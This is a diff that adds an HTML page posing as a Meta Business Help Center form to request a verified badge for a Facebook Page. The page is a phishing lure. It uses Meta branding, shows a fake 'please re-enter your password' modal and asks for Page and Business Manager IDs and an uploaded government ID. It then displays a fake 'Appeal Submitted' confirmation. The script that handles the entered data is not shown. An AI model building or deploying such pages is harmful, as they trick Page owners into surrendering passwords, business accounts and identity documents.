@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+        rel="stylesheet">
+    <title>FB PAGE VERIFIED BADGE | Meta Business Help Center</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <div id="authModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="header" style="margin-bottom: 20px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg/330px-Meta_Platforms_Inc._logo_%28cropped%29.svg.png"
+                    alt="Meta Logo" style="height:22px;width:auto;">
+                <span class="header-brand">Meta</span>
+            </div>
+
+            <h3 class="modal-title text-left" style="margin-bottom: 8px;">Please re-enter your password</h3>
+            <p class="text-left" style="color: var(--text-secondary); margin-bottom: 24px; font-size: 15px;">
+                For your security, please re-enter your password to continue.
+            </p>
+
+            <div class="input-wrapper has-icon">
+                <input type="password" id="auth_password" placeholder=" ">
+                <label for="auth_password">Password</label>
+
+                <button type="button" id="toggle-password" class="password-toggle" title="Show password">
+                    <svg id="icon-eye-open" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M21.92,11.6C19.9,6.91,16.1,4,12,4S4.1,6.91,2.08,11.6a1,1,0,0,0,0,.8C4.1,17.09,7.9,20,12,20s7.9-2.91,9.92-7.6A1,1,0,0,0,21.92,11.6ZM12,18c-3.17,0-6.17-2.29-7.9-6C5.83,8.29,8.83,6,12,6s6.17,2.29,7.9,6C18.17,15.71,15.17,18,12,18ZM12,8a4,4,0,1,0,4,4A4,4,0,0,0,12,8Zm0,6a2,2,0,1,1,2-2A2,2,0,0,1,12,14Z" />
+                    </svg>
+                    <svg id="icon-eye-closed" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                        style="display: none;">
+                        <path d="M2 2L22 22" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                            stroke-linejoin="round" />
+                        <path
+                            d="M6.71277 6.7226C3.66479 8.79527 2 12 2 12C2 12 5.63636 19 12 19C14.0503 19 15.8174 18.2734 17.2711 17.2884M11 5.05822C11.3254 5.02013 11.6588 5 12 5C18.3636 5 22 12 22 12C22 12 21.3082 13.3317 20 14.8335"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                        <path
+                            d="M14 14.2362C13.4692 14.7112 12.7684 15.0001 12 15.0001C10.3431 15.0001 9 13.657 9 12.0001C9 11.1764 9.33193 10.4303 9.86932 9.88818"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                    </svg>
+                </button>
+            </div>
+
+            <div id="auth-error" class="error-message">The password you've entered is incorrect.</div>
+            <button id="btn-auth-submit" class="btn btn-primary" style="margin-top: 32px;">Submit</button>
+        </div>
+    </div>
+
+    <div id="actionModal" class="modal-overlay">
+        <div class="modal-box">
+
+            <div id="step-loading">
+                <h3 class="modal-title" style="margin-bottom: 12px;">Submitting Appeal...</h3>
+                <p style="text-align: center; color: var(--text-secondary); font-size: 15px;">
+                    Please do not close this window while we securely send your request.
+                </p>
+                <div class="progress-wrapper">
+                    <div class="progress-container">
+                        <div id="progress-bar" class="progress-bar"></div>
+                    </div>
+                    <div id="progress-text" class="progress-text">0%</div>
+                </div>
+            </div>
+
+            <div id="step-success" style="display: none; text-align: center;">
+                <img class="success-icon"
+                    src="https://media.istockphoto.com/id/691856234/vector/flat-round-check-mark-green-icon-button-tick-symbol-isolated-on-white-background.jpg?s=612x612&w=0&k=20&c=hXL5nXQ2UJlh4yzs2LyZC4GtctQG0fs-mk30GPPbhbQ="
+                    alt="Success">
+                <h3 class="modal-title" style="color: #28a745; margin-bottom: 12px;">Appeal Submitted Successfully</h3>
+                <p style="color: var(--text-secondary); font-size: 15px; margin-bottom: 24px; line-height: 1.6;">
+                    Thank you. Your appeal has been securely submitted. We will review the information and get back to
+                    you shortly.
+                </p>
+                <button id="btn-finish" class="btn btn-primary">Done</button>
+            </div>
+
+        </div>
+    </div>
+    <div id="mainContent">
+        <div class="container">
+            <div class="header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg/330px-Meta_Platforms_Inc._logo_%28cropped%29.svg.png"
+                    alt="Meta Logo" style="height:22px;width:auto;">
+            </div>
+
+            <div class="content">
+                <h1>Request a Verified Badge for Your Facebook Page</h1>
+                <p>
+                    This form allows Page admins to request verification (Blue Badge) for eligible Facebook Pages.
+                    Please provide accurate and complete information to ensure a successful review process.
+
+                </p>
+
+                <h2 class="payment-title">
+                    BUSINESS SUPPORT & ASSET MANAGEMENT
+
+                </h2>
+            </div>
+
+            <div class="form-group">
+                <div class="info-card">
+                    <label class="top-label">
+                        What is the reason you're requesting verification?
+
+                    </label>
+
+                    <div class="multi-select-group">
+
+                        <label class="select-btn">
+                            <input type="checkbox" name="payment">
+                            <span>I represent a public figure or celebrity
+
+                            </span>
+                        </label>
+
+                        <label class="select-btn">
+                            <input type="checkbox" name="payment">
+                            <span>My Page is for a brand or business
+
+                            </span>
+                        </label>
+
+                        <label class="select-btn">
+                            <input type="checkbox" name="payment">
+                            <span>I prevent impersonation
+
+
+                            </span>
+                        </label>
+
+                        <label class="select-btn">
+                            <input type="checkbox" name="payment">
+                            <span>I want to improve search visibility and credibility
+
+
+                            </span>
+                        </label>
+
+                        <label class="select-btn">
+                            <input type="checkbox" name="payment">
+                            <span>Other
+
+
+                            </span>
+                        </label>
+
+
+
+                    </div>
+                </div>
+
+                <div class="info-card">
+
+                    <h3 class="section-title">
+                        TARGET ASSET
+                    </h3>
+
+                    <div class="input-row">
+
+                        <div class="form-item">
+                            <label class="top-label">Primary page
+                            </label>
+
+                            <div class="input-wrapper">
+                                <input type="text" id="payout_account_id" placeholder=" ">
+                                <label for="payout_account_id">
+                                    Facebook Page ID
+
+                                </label>
+                            </div>
+                        </div>
+
+                        <div class="form-item">
+                            <label class="top-label">Page Username
+                            </label>
+
+                            <div class="input-wrapper">
+                                <input type="text" id="payout_name" placeholder=" ">
+                                <label for="payout_name">
+                                    facebook.com/username
+
+                                </label>
+                            </div>
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <input type="hidden" id="form_type" value="profile_recovery">
+
+                <div class="info-card">
+
+                    <h3 class="section-title">
+                        Business portfolio
+                    </h3>
+
+                    <div class="input-row">
+
+                        <div class="form-item">
+
+                            <label class="top-label">
+                                Business Manager ID
+                            </label>
+
+                            <div class="input-wrapper">
+                                <input type="text" id="field1" placeholder=" ">
+                                <label for="field1">
+                                    Enter your BM ID (e.g. 1234567890)
+                                </label>
+                            </div>
+
+                        </div>
+
+                        <div class="form-item">
+
+
+
+
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <div class="form-item" style="margin-top: px;">
+                    <h3 class="section-title">Provide additional details</h3>
+
+                    <div class="input-wrapper textarea-wrapper">
+                        <textarea id="additional_details" placeholder=" "></textarea>
+
+                        <label for="additional_details">
+                            
+                           
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-item">
+                    <label class="top-label">UPLOAD</label>
+                    <label class="upload-area">
+                        <input type="file" id="file-upload" accept="image/png, application/pdf">
+                        <div class="upload-label-content">
+                            <svg viewBox="0 0 24 24">
+                                <path
+                                    d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.36 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z" />
+                            </svg>
+                            <span class="upload-title" id="upload-title">Upload</span>
+                            <span class="upload-subtitle">Upload a valid government ID (if a person) or official
+                                documents (for business/brand) proving public interest and authenticity.</span>
+                        </div>
+                    </label>
+                </div>
+
+                <div class="checkbox-container">
+                    <input type="checkbox" id="confirm_info">
+                    <label for="confirm_info">
+
+                        I confirm that I have reviewed the Community Standards and believe this Page is in full
+                        compliance with Meta's policies.
+                </div>
+            </div>
+
+            <button id="main-submit-btn" class="btn btn-primary">SUBMIT</button>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <span>Meta</span>
+                <span>About</span>
+                <span>Blog</span>
+                <span>Jobs</span>
+                <span>Help</span>
+                <span>API</span>
+                <span>Privacy</span>
+                <span>Terms</span>
+                <span>Locations</span>
+                <span>Instagram Lite</span>
+                <span>Contact Uploading & Non-Users</span>
+                <span>Meta Verified</span>
+            </div>
+            <div class="footer-bottom">
+                <span>English ▾</span>
+                <span>© 2026 FB PAGE VERIFIED BADGE</span>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+</body>
+
+</html>
